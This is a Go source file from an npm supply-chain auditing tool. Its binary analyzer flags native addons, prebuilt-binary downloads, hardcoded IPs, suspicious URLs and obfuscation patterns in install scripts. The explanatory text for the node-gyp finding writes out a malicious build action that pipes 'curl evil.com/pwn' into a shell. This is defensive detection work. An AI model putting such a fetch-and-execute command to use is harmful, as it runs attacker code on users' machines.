package analyzer

import (
	"context"
	"fmt"
	"regexp"
	"strings"

	"github.com/matthias/auditter/internal/registry"
)

// BinaryAnalyzer detects native addons, binary downloads, and obfuscated code patterns.
type BinaryAnalyzer struct{}

func NewBinaryAnalyzer() *BinaryAnalyzer { return &BinaryAnalyzer{} }

func (b *BinaryAnalyzer) Name() string { return "binary-analysis" }

// Patterns that suggest data exfiltration or obfuscation.
var (
	ipPattern      = regexp.MustCompile(`\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`)
	urlPattern     = regexp.MustCompile(`https?://[^\s"'\)]+`)
	hexPattern     = regexp.MustCompile(`(?:0x[0-9a-fA-F]{8,}|\\x[0-9a-fA-F]{2}){4,}`)
	base64Pattern  = regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`)
	obfuscPatterns = []struct {
		pattern     *regexp.Regexp
		description string
	}{
		{regexp.MustCompile(`_0x[0-9a-f]{4,}`), "JavaScript obfuscator variable pattern (_0x...)"},
		{regexp.MustCompile(`\['\\x[0-9a-f]{2}`), "Hex-encoded property access"},
		{regexp.MustCompile(`String\s*\.\s*fromCharCode`), "String.fromCharCode usage (potential obfuscation)"},
		{regexp.MustCompile(`atob\s*\(`), "Base64 decoding (atob)"},
		{regexp.MustCompile(`unescape\s*\(`), "unescape() usage"},
	}
)

func (b *BinaryAnalyzer) Analyze(_ context.Context, _ *registry.PackageMetadata, version *registry.PackageVersion) ([]Finding, error) {
	var findings []Finding

	// Check for native addon indicators
	if version.GypFile {
		findings = append(findings, Finding{
			Analyzer:    b.Name(),
			Title:       "Native addon (node-gyp)",
			Description: "Package contains a .gyp file indicating native C/C++ addon compilation",
			Severity:    SeverityMedium,
			ExploitExample: "Native addons compile and execute C/C++ code on install:\n" +
				"    - C code has unrestricted system access (no JS sandbox)\n" +
				"    - Malicious binding.gyp can execute arbitrary build commands:\n" +
				"      {\"actions\": [{\"action\": [\"sh\",\"-c\",\"curl evil.com/pwn|sh\"]}]}\n" +
				"    - Compiled .node files are opaque binaries — harder to audit than JS",
		})
	}

	if version.Binary != nil {
		findings = append(findings, Finding{
			Analyzer:    b.Name(),
			Title:       "Binary distribution",
			Description: "Package declares binary distribution configuration",
			Severity:    SeverityMedium,
			ExploitExample: "Binary packages download and execute prebuilt executables:\n" +
				"    - The binary may differ from what the source code compiles to\n" +
				"    - No way to verify without reproducible builds\n" +
				"    - Attacker can serve different binaries per-platform or per-IP\n" +
				"    - The binary runs with full system permissions",
		})
	}

	// Analyze install scripts for binary download patterns
	if version.Scripts != nil {
		b.analyzeScriptsForBinary(version.Scripts, &findings)
	}

	return findings, nil
}

func (b *BinaryAnalyzer) analyzeScriptsForBinary(scripts map[string]string, findings *[]Finding) {
	binaryDownloadPatterns := []string{
		"node-pre-gyp", "prebuild-install", "node-gyp rebuild",
		"napi", "cmake-js", "pkg-fetch",
	}

	for scriptName, scriptBody := range scripts {
		lower := strings.ToLower(scriptBody)

		// Check for binary download tools
		for _, pattern := range binaryDownloadPatterns {
			if strings.Contains(lower, pattern) {
				*findings = append(*findings, Finding{
					Analyzer:    b.Name(),
					Title:       fmt.Sprintf("Binary download tool in %s", scriptName),
					Description: fmt.Sprintf("Script uses %q which downloads prebuilt binaries", pattern),
					Severity:    SeverityMedium,
					ExploitExample: fmt.Sprintf(
						"Binary download tools fetch executables from remote servers:\n"+
							"    - %q downloads prebuilt binaries during install\n"+
							"    - Compromised CDN or registry serves malicious binary\n"+
							"    - Binary executes with full user permissions\n"+
							"    - Verify checksums and use --build-from-source when possible",
						pattern),
				})
			}
		}

		// Check for hardcoded IPs in scripts
		if ips := ipPattern.FindAllString(scriptBody, -1); len(ips) > 0 {
			for _, ip := range ips {
				if !isLocalIP(ip) {
					*findings = append(*findings, Finding{
						Analyzer:    b.Name(),
						Title:       fmt.Sprintf("Hardcoded IP in %s", scriptName),
						Description: fmt.Sprintf("Script contains hardcoded IP address: %s", ip),
						Severity:    SeverityHigh,
						ExploitExample: fmt.Sprintf(
							"Hardcoded IP addresses bypass DNS-based security controls:\n"+
								"    - Direct IP %s avoids corporate DNS logging/filtering\n"+
								"    - Domain blocklists are ineffective against raw IPs\n"+
								"    - Attacker controls the server at this address\n"+
								"    - IPs in install scripts almost always indicate malicious activity",
							ip),
					})
				}
			}
		}

		// Check for suspicious URLs
		if urls := urlPattern.FindAllString(scriptBody, -1); len(urls) > 0 {
			for _, u := range urls {
				if isSuspiciousURL(u) {
					*findings = append(*findings, Finding{
						Analyzer:    b.Name(),
						Title:       fmt.Sprintf("Suspicious URL in %s", scriptName),
						Description: fmt.Sprintf("Script contains suspicious URL: %s", truncate(u, 80)),
						Severity:    SeverityHigh,
						ExploitExample: "Suspicious URLs in install scripts indicate payload delivery:\n" +
							"    - URL shorteners (bit.ly, tinyurl) hide the real destination\n" +
							"    - IP-based URLs avoid domain reputation checks\n" +
							"    - The script downloads and executes whatever the server returns\n" +
							"    - The payload can change at any time — benign today, malicious tomorrow",
					})
				}
			}
		}

		// Check for obfuscation patterns
		for _, op := range obfuscPatterns {
			if op.pattern.MatchString(scriptBody) {
				*findings = append(*findings, Finding{
					Analyzer:    b.Name(),
					Title:       fmt.Sprintf("Obfuscation pattern in %s", scriptName),
					Description: op.description,
					Severity:    SeverityHigh,
					ExploitExample: "Obfuscated code is designed to evade human review and automated scanning:\n" +
						"    - Variables like _0x4a2b3c are output of javascript-obfuscator\n" +
						"    - Hex property access: obj['\\x65\\x76\\x61\\x6c'] calls obj.eval\n" +
						"    - String.fromCharCode(114,101,113,117,105,114,101) = 'require'\n" +
						"    - Legitimate packages have no reason to obfuscate install scripts\n" +
						"    - Deobfuscate with: npx js-deobfuscator or https://deobfuscate.io",
				})
			}
		}
	}
}

func isLocalIP(ip string) bool {
	return strings.HasPrefix(ip, "127.") ||
		strings.HasPrefix(ip, "0.0.") ||
		strings.HasPrefix(ip, "192.168.") ||
		strings.HasPrefix(ip, "10.") ||
		ip == "0.0.0.0"
}

func isSuspiciousURL(u string) bool {
	// URLs to non-standard hosts for npm packages
	trusted := []string{
		"github.com", "gitlab.com", "npmjs.org", "npmjs.com",
		"nodejs.org", "registry.npmjs.org", "api.npmjs.org",
	}
	lower := strings.ToLower(u)
	for _, host := range trusted {
		if strings.Contains(lower, host) {
			return false
		}
	}
	// URLs containing IPs are suspicious
	if ipPattern.MatchString(u) {
		return true
	}
	// Short/obfuscated URLs
	shorteners := []string{"bit.ly", "tinyurl", "t.co", "goo.gl", "is.gd"}
	for _, s := range shorteners {
		if strings.Contains(lower, s) {
			return true
		}
	}
	return false
}
